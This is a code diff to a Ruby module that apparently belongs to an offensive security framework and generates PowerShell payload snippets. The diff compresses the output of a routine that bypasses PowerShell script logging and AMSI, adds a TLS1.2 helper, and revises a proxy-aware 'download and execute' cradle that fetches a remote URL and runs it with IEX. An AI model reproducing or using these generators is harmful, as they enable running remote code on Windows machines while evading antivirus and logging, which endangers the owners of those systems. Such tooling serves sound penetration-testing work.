@@ -124,12 +124,12 @@ module Powershell
     #
     # @return [String] PowerShell code to disable PowerShell Built-In Protections
     def self.bypass_powershell_protections()
-      %Q{
+      uglify_ps(%Q{
         If($PSVersionTable.PSVersion.Major -ge 3){
           #{self.bypass_script_log}
           #{self.bypass_amsi}
         }
-      }
+      })
     end
 
     #
@@ -148,6 +148,14 @@ module Powershell
     end
 
     #
+    # Force use of TLS1.2
+    #
+    # @ return [String] Powershell code to force use of TLS1.2
+    def self.force_tls12()
+      %Q^[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;^
+    end
+
+    #
     # Use the default system web proxy and credentials to download a URL
     # as a string and execute the contents as PowerShell
     #
@@ -158,14 +166,20 @@ module Powershell
     def self.proxy_aware_download_and_exec_string(url, iex = true)
       var = Rex::Text.rand_text_alpha(1)
       cmd = "$#{var}=new-object net.webclient;"
+      cmd << "if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){"
       cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
       cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
+      cmd << "};"
       if iex
-        cmd << "IEX $#{var}.downloadstring('#{url}');"
+        cmd << "IEX ([System.Text.Encoding]::ASCII.GetString($#{var}.downloaddata('#{url}')));"
       else
         cmd << "&([scriptblock]::create($#{var}.downloadstring('#{url}'));"
       end
       cmd
+    end
+
+    def self.uglify_ps(script)
+      return script.gsub(/\ +/, " ").gsub(/\n+/, '')
     end
   end
 end
